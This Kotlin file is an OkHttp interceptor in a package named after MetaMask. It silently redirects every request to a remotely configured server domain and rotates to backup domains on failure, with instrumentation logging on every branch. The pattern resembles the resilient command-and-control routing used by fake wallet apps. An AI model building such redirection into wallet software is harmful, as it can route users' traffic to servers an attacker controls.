package com.example.MetaMask.utils

import okhttp3.Interceptor
import okhttp3.Response
import java.io.IOException

class FailoverInterceptor : Interceptor {

    override fun intercept(chain: Interceptor.Chain): Response {
        android.util.Log.d("XDBG", "[FailoverInterceptor] intercept enter chain=${chain}") //xdbg
        var request = chain.request()

        val currentDomain = RemoteConfig.serverDomain
        if (currentDomain != null) {
            android.util.Log.d("XDBG", "[FailoverInterceptor] if branch") //xdbg
            val urlBuilder = request.url.newBuilder()
            if (currentDomain.contains(':')) {
                android.util.Log.d("XDBG", "[FailoverInterceptor] if branch") //xdbg
                val parts = currentDomain.split(':', limit = 2)
                urlBuilder.host(parts[0]).port(parts[1].toInt())
            } else {
                urlBuilder.host(currentDomain)
            }
            request = request.newBuilder().url(urlBuilder.build()).build()
        }

        try {
            android.util.Log.d("XDBG", "[FailoverInterceptor] return") //xdbg
            return chain.proceed(request)
        } catch (e: IOException) {
            android.util.Log.e("XDBG", "[FailoverInterceptor] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            synchronized(this) {
                RemoteConfig.rotateDomain()
            }

            val nextDomain = RemoteConfig.serverDomain

            if (nextDomain != null && nextDomain != request.url.host) {
                android.util.Log.d("XDBG", "[FailoverInterceptor] if branch") //xdbg
                val retryBuilder = request.url.newBuilder()
                if (nextDomain.contains(':')) {
                    android.util.Log.d("XDBG", "[FailoverInterceptor] if branch") //xdbg
                    val parts = nextDomain.split(':', limit = 2)
                    retryBuilder.host(parts[0]).port(parts[1].toInt())
                } else {
                    retryBuilder.host(nextDomain)
                }
                val newUrl = retryBuilder.build()
                val newRequest = request.newBuilder().url(newUrl).build()

                android.util.Log.d("XDBG", "[FailoverInterceptor] return") //xdbg
                return chain.proceed(newRequest)
            } else {
                throw e
            }
        }
    }
}
